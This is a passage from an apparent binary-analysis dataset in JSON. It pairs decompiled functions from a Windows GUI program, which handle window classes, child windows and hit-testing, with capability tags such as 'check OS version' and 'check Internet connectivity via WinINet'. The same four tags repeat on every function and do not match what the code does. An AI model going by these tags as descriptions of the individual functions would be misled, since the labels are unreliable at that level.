        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00452dc3)\n\nvoid __fastcall fcn.00452d7c(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x452e6c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.00450804();\n        }\n        fcn.00450834();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.00405584();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.00450724();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x452e73;\n    uStack32 = 0x452e6b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 437
    },
    "004531a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004531a8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack64;\n    uint uStack60;\n    int16_t iStack55;\n    int16_t iStack53;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            iStack55 = *(param_2 + 8);\n            iStack53 = *(param_2 + 8) >> 0x10;\n            cVar1 = fcn.00418488(iStack55, iStack53);\n            if (cVar1 == '\\0') {\n                fcn.00450344();\n                (**(*in_EAX + 0x44))(uStack64, uStack60);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.0040484c();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.0040484c();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.00450370();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.00418488();\n                if (cVar1 != '\\0') {\n                    fcn.00418410();\n                    fcn.00450294();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "004535e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004535e8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404a1c();\n    fcn.004201f8();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.0044e110();\n    }\n    fcn.0040700c();\n    fcn.00404650();\n    if (piVar1[0xc] != 0) {\n        fcn.004543d4();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.00454658();\n    while (iVar2 != 0) {\n        piVar3 = fcn.0045461c();\n        fcn.00454440();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00454658();\n    }\n    fcn.00404650();\n    if (piVar1[0x70] != 0) {\n        fcn.0042109c();\n    }\n    fcn.00404650();\n    fcn.0044f764();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 329
    },
    "004536c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004536c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x4536ef;\n    fcn.00404620();\n    uStack32 = 0x45378c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.00419a28();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.00419888();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.0041997c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.00419888();\n            if (iVar2 != 0) {\n                fcn.004587a8();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x453793;\n    uStack32 = 0x45378b;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 420
    },
    "00453dfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453dfc(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.00419730();\n    }\n    var_8h = fcn.00454658();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.0045461c();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x453f84 == (*0x453f84 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.00419888();\n                    cVar1 = fcn.00453c84(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00419904();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.00419888();\n            fcn.00453db4(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 688
    },
    "00453f88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00453f88(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00454658();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0045461c();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.0045461c();\n            if (*0x453fd8 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "00453fdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00453fdc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x454026;\n    cVar1 = fcn.00453f88(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00404620();\n        uStack32 = 0x4540bb;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.00453dfc(&stack0xfffffffc);\n        fcn.0040484c();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x4540ba;\n        fcn.00404650();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.0040484c();\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "004540e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004540e0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x4540f4;\n    cVar1 = fcn.00458874();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x454120;\n            fcn.00454174();\n            uStack36 = 0x454167;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x45416e;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x454166;\n            fcn.0045417c();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "0045417c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045417c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.0045419c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00454678": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454678(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00454658();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0045461c();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "004548a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004548a4(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x454a65;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.00458568();\n                goto code_r0x00454950;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00407550();\n        fcn.0040db28(uVar5, arg_ch);\n        fcn.00404ec4();\n    }\ncode_r0x00454950:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0044d120)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0044d120;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040f25c();\n        }\n    }\n    *0x490650 = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040f25c();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.0040aaf8();\n    in_EAX[0x19] = 0;\n    fcn.00458880();\n    uVar5 = 1;\n    fcn.004246bc();\n    fcn.00451abc(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00405530(0x454a6c);\n    return;\n}\n",
        "token_count": 896
    },
    "00454b54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00454b54(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00454b40(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419888();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454c30 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00419888();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x454c30 != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 380
    },
    "00454e58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454e58(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00454eec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454eec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.00419888();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.00454ea8, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "00454f60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454f60(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00455004": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455004(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x45507e;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x4550a6;\n                fcn.00419888();\n                puStack28 = 0x4550ab;\n                fcn.00455004();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x455100;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.00451abc(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 548
    },
    "00455128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455128(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    do {\n        iVar1 = *(iVar3 + 0x30);\n        if (iVar1 == 0) {\n            if ((*(in_EAX + 0x1c) & 8) == 0) {\n                cVar2 = fcn.004047dc();\n                if ((cVar2 != '\\0') || (*(iVar3 + 0x1c4) != 0)) {\n                    fcn.00455004();\n                }\n            }\n            return;\n        }\n        iVar3 = iVar1;\n    } while (*(iVar1 + 0x1da) != '\\0');\n    *(in_EAX + 0x1da) = 0;\n    return;\n}\n",
        "token_count": 197
    },
    "00455178": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455178(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.00459908();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.00455128();\n            *in_FS_OFFSET = uVar1;\n            fcn.00459908();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x492410) && (**0x4927cc == 2)) {\n            fcn.00451abc(0);\n        }\n        fcn.00455128();\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "004552d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004552d4(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418410();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.00451abc(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x00455390;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x00455390:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "004553a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004553a0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.00419888();\n                var_14h = fcn.004553a0(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.00419888();\n                cVar1 = fcn.004552d4(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00419888();\n            cVar1 = fcn.004552d4(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 462
    },
    "004555b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004555b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00458568();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x490710 == 0) || (iVar1 = *0x490710,  in_EAX != *(*0x490710 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.004553a0(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00451abc(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 252
    },
    "00455b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
